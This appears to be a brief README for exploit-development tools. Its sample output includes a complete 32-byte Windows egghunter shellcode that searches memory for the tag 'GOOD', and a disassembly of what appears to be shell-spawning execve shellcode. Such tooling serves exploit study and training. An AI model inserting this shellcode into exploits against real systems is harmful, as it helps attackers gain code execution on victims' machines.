# Tools

- egghunter.py

```shell
$ egghunter.py --egg GOOD
[+] Egghunter length: 32 bytes
egghunter = (
	"\x66\x81\xca\xff\x0f"          # or	dx, 0xfff
	"\x42"                          # inc	edx
	"\x52"                          # push	edx
	"\x6a\x02"                      # push	2
	"\x58"                          # pop	eax
	"\xcd\x2e"                      # int	0x2e
	"\x3c\x05"                      # cmp	al, 5
	"\x5a"                          # pop	edx
	"\x74\xef"                      # je	0x1000
	"\xb8\x44\x4f\x4f\x47"          # mov	eax, 0x474f4f44
	"\x8b\xfa"                      # mov	edi, edx
	"\xaf"                          # scasd	eax, dword ptr es:[edi]
	"\x75\xea"                      # jne	0x1005
	"\xaf"                          # scasd	eax, dword ptr es:[edi]
	"\x75\xe7"                      # jne	0x1005
	"\xff\xe7"                      # jmp	edi
)

```
- disassemble.py
```shell
$ disassemble.py x86 32
len = 27
0x1000:	xor	eax, eax
0x1002:	dec	eax
0x1003:	mov	ebx, 0x91969dd1
0x1008:	ror	byte ptr [edi + edx*4 - 0x2408b701], 1
0x100f:	push	ebx
0x1010:	push	esp
0x1011:	pop	edi
0x1012:	cdq	
0x1013:	push	edx
0x1014:	push	edi
0x1015:	push	esp
0x1016:	pop	esi
0x1017:	mov	al, 0x3b
0x1019:	syscall	

```
